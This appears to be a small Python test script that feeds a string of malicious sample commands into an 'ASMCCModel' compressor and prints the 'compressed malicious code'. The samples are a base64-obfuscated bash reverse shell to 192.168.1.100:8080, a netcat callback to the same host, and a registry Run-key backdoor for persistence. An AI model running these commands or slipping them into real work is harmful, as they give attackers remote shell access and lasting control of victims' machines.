# main.py
from asmcc_model import ASMCCModel

TEST_MALICIOUS_CODE = """
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzgwODAgMD4mMQ== | base64 -d | bash
os.system("whoami && nc 192.168.1.100 8080")
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d cmd.exe
"""

if __name__ == "__main__":
    # 初始化模型
    model = ASMCCModel()
    # 执行压缩
    compressed_code = model.compress(TEST_MALICIOUS_CODE)
    # 输出结果
    print("\n" + "=" * 50)
    print("【最终压缩后的恶意代码】")
    print("=" * 50)
    print(compressed_code)